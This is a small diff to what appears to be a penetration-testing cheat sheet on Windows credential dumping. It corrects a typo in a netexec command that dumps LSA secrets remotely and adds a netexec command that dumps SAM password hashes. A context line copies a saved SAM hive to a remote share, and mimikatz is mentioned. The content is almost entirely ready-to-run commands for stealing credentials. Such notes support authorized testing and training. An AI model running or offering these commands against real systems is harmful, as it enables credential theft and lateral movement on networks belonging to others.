@@ -54,6 +54,9 @@ move sam.save \\<hoost ip>\SHARENAME
 			-> `mimikatz`
 #### Dumping LSA secrets remotely
 ```bash
-etexec smb targetip --local-auth -u user -p password --lsa
+netexec smb targetip --local-auth -u user -p password --lsa
 ```
-	
+#### Dumping SAM Remotely
+```bash
+netexec smb target --local-auth -u user -p pass --sam
+```
